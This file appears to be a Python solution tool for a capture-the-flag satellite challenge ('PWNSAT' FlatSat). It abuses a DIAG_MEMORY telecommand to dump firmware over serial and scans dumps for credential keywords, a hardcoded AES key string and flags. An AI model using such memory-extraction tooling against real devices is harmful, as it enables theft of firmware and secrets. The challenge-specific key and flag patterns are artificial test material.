#!/usr/bin/env python3
"""FW-04: Firmware memory dumper via DIAG_MEMORY telecommand.

The FlatSat firmware exposes a DIAG_MEMORY APID (0x031) that responds
with memory contents at a given address. This tool automates memory
extraction to dump firmware, find hardcoded keys, and discover flags.

Can also process binary firmware dumps (.bin/.elf) for offline analysis.
"""

import re
import struct
import sys
import time

sys.path.insert(0, sys.path[0] or ".")
from ccsds_tools import (
    APIDS,
    build_tc_frame,
    parse_frame,
)


def build_mem_read(address: int, length: int = 64) -> bytes:
    """Build a DIAG_MEMORY TC frame to read memory at address."""
    payload = struct.pack("<IH", address, length)
    return build_tc_frame(APIDS["DIAG_MEMORY"], payload)


def dump_memory(port: str, start_addr: int, length: int, chunk_size: int = 64, output: str | None = None):
    """Dump memory from the FlatSat via DIAG_MEMORY requests."""
    import serial

    ser = serial.Serial(port, 115200, timeout=3, dsrdtr=False, rtscts=False)
    time.sleep(1)
    ser.reset_input_buffer()

    dump = bytearray()
    addr = start_addr
    end = start_addr + length
    retries = 0
    max_retries = 3

    print(f"[*] Dumping 0x{start_addr:08X} - 0x{end:08X} ({length} bytes)")
    print(f"[*] Chunk size: {chunk_size} bytes")
    print()

    while addr < end:
        remaining = min(chunk_size, end - addr)
        frame = build_mem_read(addr, remaining)

        ser.reset_input_buffer()
        cmd = f"TX {frame.hex().upper()}\r\n"
        ser.write(cmd.encode("ascii"))
        ser.flush()

        time.sleep(0.5)
        resp = ser.read(ser.in_waiting or 256)

        if resp:
            # Try to parse response as CCSDS frame
            # Look for hex data in response
            resp_str = resp.decode(errors="replace")
            hex_match = re.search(r"[0-9a-fA-F]{12,}", resp_str)

            if hex_match:
                try:
                    frame_data = bytes.fromhex(hex_match.group())
                    p = parse_frame(frame_data)
                    if p.get("payload"):
                        data = p["payload"]
                        dump.extend(data[:remaining])
                        progress = (addr - start_addr + remaining) / length * 100
                        sys.stdout.write(
                            f"\r[{progress:5.1f}%] 0x{addr:08X}: {data[:16].hex()} {'.' * min(16, len(data))}"
                        )
                        sys.stdout.flush()
                        addr += remaining
                        retries = 0
                        continue
                except ValueError:
                    pass

            # Raw response (non-CCSDS)
            raw = resp.strip()
            if len(raw) >= remaining:
                dump.extend(raw[:remaining])
                addr += remaining
                retries = 0
                continue

        retries += 1
        if retries >= max_retries:
            print(f"\n[!] Failed to read at 0x{addr:08X} after {max_retries} retries")
            dump.extend(b"\xff" * remaining)  # Fill with 0xFF
            addr += remaining
            retries = 0

    ser.close()

    print(f"\n\n[*] Dumped {len(dump)} bytes")

    if output:
        with open(output, "wb") as f:
            f.write(dump)
        print(f"[*] Saved to {output}")

    return bytes(dump)


def analyze_dump(filepath: str, search_strings: bool = True, search_keys: bool = True):
    """Analyze a firmware dump for interesting content."""
    with open(filepath, "rb") as f:
        data = f.read()

    print(f"[*] Analyzing: {filepath} ({len(data)} bytes)")
    print()

    if search_strings:
        print("[*] Extractable strings:")
        # Find printable strings >= 6 chars
        strings = re.findall(rb"[\x20-\x7e]{6,}", data)
        for s in strings:
            decoded = s.decode("ascii")
            # Highlight interesting ones
            prefix = "  "
            if "PWNSAT{" in decoded:
                prefix = "  [FLAG]  "
            elif any(kw in decoded.lower() for kw in ["key", "password", "secret", "token", "admin"]):
                prefix = "  [CRED]  "
            elif any(kw in decoded.lower() for kw in ["version", "build", "firmware"]):
                prefix = "  [INFO]  "
            if prefix != "  " or len(strings) < 100:
                print(f"{prefix}{decoded}")

    if search_keys:
        print("\n[*] Searching for crypto key patterns...")

        # AES-128 key pattern: 16 bytes of high entropy
        for i in range(len(data) - 16):
            block = data[i : i + 16]
            # Check if it looks like a key (printable ASCII, common CTF patterns)
            if block == b"PWNSAT_K3Y_2026!":
                print(f"  [KEY] AES key at offset 0x{i:08X}: {block.hex()} ({block.decode('ascii', errors='replace')})")
            elif b"PWNSAT" in block:
                print(f"  [KEY] XOR key at offset 0x{i:08X}: {block.hex()} ({block.decode('ascii', errors='replace')})")

        # Search for flag pattern
        flag_pattern = rb"PWNSAT\{[^\}]+\}"
        flags = re.finditer(flag_pattern, data)
        for match in flags:
            print(f"  [FLAG] at offset 0x{match.start():08X}: {match.group().decode()}")


def hexdump(filepath: str, offset: int = 0, length: int = 256):
    """Classic hexdump of a binary file."""
    with open(filepath, "rb") as f:
        f.seek(offset)
        data = f.read(length)

    print(f"[*] {filepath} @ 0x{offset:08X} ({length} bytes)")
    print()

    for i in range(0, len(data), 16):
        chunk = data[i : i + 16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"  {offset + i:08x}  {hex_part:<48s}  |{ascii_part}|")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  fw_dumper.py dump <port> <start_hex> <length> [output.bin]")
        print("  fw_dumper.py analyze <firmware.bin>")
        print("  fw_dumper.py hexdump <firmware.bin> [offset_hex] [length]")
        print()
        print("Dump firmware memory via DIAG_MEMORY, or analyze existing dumps.")
        print("Searches for flags, crypto keys, and printable strings.")
        sys.exit(1)

    cmd = sys.argv[1]

    if cmd == "dump":
        port = sys.argv[2]
        start = int(sys.argv[3], 16)
        length = int(sys.argv[4])
        out = sys.argv[5] if len(sys.argv) > 5 else None
        dump_memory(port, start, length, output=out)

    elif cmd == "analyze":
        analyze_dump(sys.argv[2])

    elif cmd == "hexdump":
        filepath = sys.argv[2]
        off = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0
        ln = int(sys.argv[4]) if len(sys.argv) > 4 else 256
        hexdump(filepath, off, ln)
